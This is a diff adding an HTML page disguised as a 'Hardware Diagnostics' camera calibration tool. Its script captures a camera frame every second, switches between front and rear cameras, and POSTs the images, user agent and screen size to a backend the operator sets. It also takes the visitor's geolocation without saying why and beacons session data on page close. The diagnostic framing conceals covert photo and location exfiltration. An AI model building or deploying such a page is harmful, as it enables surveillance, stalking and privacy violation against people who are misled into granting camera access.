@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hardware Diagnostics Suite v2.4</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f8;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 1.5rem;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+        }
+        .subtitle {
+            font-size: 0.9rem;
+            color: #7f8c8d;
+            margin-bottom: 1.5rem;
+        }
+        .camera-preview {
+            width: 100%;
+            height: 200px;
+            background: #2c3e50;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 0.9rem;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .controls {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        button:disabled {
+            background-color: #bdc3c7;
+            cursor: not-allowed;
+        }
+        .status {
+            font-size: 0.8rem;
+            color: #7f8c8d;
+            margin-top: 1rem;
+        }
+        .progress-bar {
+            height: 8px;
+            background-color: #ecf0f1;
+            border-radius: 4px;
+            margin-top: 1rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background-color: #2ecc71;
+            transition: width 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hardware Diagnostics</h1>
+        <p class="subtitle">Calibrando sensores de imagem para o pipeline de visão computacional.</p>
+        
+        <div class="camera-preview" id="cameraContainer">
+            <video id="videoStream" autoplay playsinline></video>
+            <div id="placeholder">Clique em 'Iniciar Teste' para ativar as câmeras</div>
+        </div>
+
+        <div class="controls">
+            <button id="startBtn">Iniciar Teste</button>
+            <button id="switchBtn" disabled>Alternar Câmera</button>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        <p class="status" id="statusText">Aguardando inicialização...</p>
+    </div>
+
+    <script>
+    const video = document.getElementById('videoStream');
+    const placeholder = document.getElementById('placeholder');
+    const startBtn = document.getElementById('startBtn');
+    const switchBtn = document.getElementById('switchBtn');
+    const statusText = document.getElementById('statusText');
+    const progressFill = document.getElementById('progress');
+    
+    let stream = null;
+    let currentFacing = 'user'; // 'user' (frontal) ou 'environment' (traseira)
+    let captureInterval = null;
+    let progress = 0;
+    let isTesting = false;
+
+    // Função para capturar e enviar frames
+    function captureFrame() {
+        if (!stream || !isTesting) return;
+        
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        
+        // Garante que o vídeo está pronto
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg', 0.6);
+            
+            // Envia para o seu backend
+            fetch('/api/captura', { // ATUALIZE PARA SEU IP
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    facingMode: currentFacing,
+                    image: dataURL,
+                    userAgent: navigator.userAgent,
+                    screenRes: `${window.screen.width}x${window.screen.height}`
+                })
+            }).catch(err => console.error('Erro ao enviar frame:', err));
+
+            // Atualiza a barra de progresso
+            progress += 10;
+            if (progress > 100) progress = 100;
+            progressFill.style.width = `${progress}%`;
+            
+            if (progress >= 100) {
+                statusText.textContent = "Teste concluído! Obrigado pela colaboração.";
+                startBtn.disabled = true;
+                switchBtn.disabled = true;
+                clearInterval(captureInterval);
+                isTesting = false;
+            }
+        }
+    }
+
+    // Função para iniciar o stream
+    async function startStream(facingMode) {
+        try {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            
+            currentFacing = facingMode;
+            statusText.textContent = `Solicitando acesso à câmera ${facingMode === 'user' ? 'frontal' : 'traseira'}...`;
+            
+            // Configurações de vídeo
+            const constraints = {
+                video: { 
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            };
+
+            // Tenta obter o stream
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // Conecta ao elemento de vídeo
+            video.srcObject = stream;
+            
+            // Aguarda o vídeo carregar
+            await new Promise((resolve) => {
+                if (video.readyState === 4) {
+                    resolve();
+                } else {
+                    video.onloadeddata = () => resolve();
+                }
+            });
+
+            // Esconde o placeholder e habilita controles
+            placeholder.style.display = 'none';
+            switchBtn.disabled = false;
+            startBtn.textContent = "Reiniciar Teste";
+            startBtn.disabled = false;
+            
+            statusText.textContent = `Câmera ${facingMode === 'user' ? 'frontal' : 'traseira'} ativa. Capturando...`;
+            
+            // Inicia o loop de captura
+            if (captureInterval) clearInterval(captureInterval);
+            isTesting = true;
+            progress = 0;
+            captureInterval = setInterval(captureFrame, 1000); // Captura a cada 1s
+            
+            // Pede a localização (opcional, mas útil)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        fetch('/api/geolocalizacao', { // ATUALIZE PARA SEU IP
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            })
+                        });
+                    },
+                    (error) => console.log('Geo error:', error)
+                );
+            }
+
+        } catch (err) {
+            console.error("Erro detalhado na câmera:", err);
+            let errorMsg = "Erro ao acessar câmeras. ";
+            
+            if (err.name === "NotAllowedError") {
+                errorMsg += "Permissão negada. Verifique se você clicou em 'Permitir' no prompt do navegador.";
+            } else if (err.name === "NotFoundError") {
+                errorMsg += "Nenhuma câmera encontrada. Verifique se a câmera está conectada.";
+            } else if (err.name === "NotReadableError") {
+                errorMsg += "Câmera indisponível. Outro aplicativo pode estar usando a câmera.";
+            } else {
+                errorMsg += err.message;
+            }
+            
+            statusText.textContent = errorMsg;
+            startBtn.disabled = false;
+            switchBtn.disabled = true;
+            placeholder.style.display = 'block';
+            placeholder.textContent = "Clique em 'Iniciar Teste' para tentar novamente";
+        }
+    }
+
+    // Eventos dos botões
+    startBtn.addEventListener('click', () => {
+        startBtn.disabled = true;
+        startStream('user'); // Começa com a frontal
+    });
+
+    switchBtn.addEventListener('click', () => {
+        const newFacing = currentFacing === 'user' ? 'environment' : 'user';
+        startStream(newFacing);
+    });
+
+    // Wake Lock para manter a tela ligada
+    let wakeLockSentinel;
+    async function requestWakeLock() {
+        try {
+            wakeLockSentinel = await navigator.wakeLock.request('screen');
+            statusText.textContent += " [Tela mantida ativa]";
+        } catch (err) {
+            console.error(`Wake Lock request failed: ${err.name} ${err.message}`);
+        }
+    }
+
+    // Chama o Wake Lock quando o teste iniciar
+    startBtn.addEventListener('click', requestWakeLock);
+
+    // Envia dados finais quando a página for fechada
+    window.addEventListener('beforeunload', (event) => {
+        const finalData = {
+            status: 'session_closed',
+            duration_ms: performance.now(),
+            userAgent: navigator.userAgent
+        };
+        navigator.sendBeacon('/api/sessao_final', JSON.stringify(finalData)); // ATUALIZE PARA SEU IP
+    });
+</script>
+</body>
+</html>
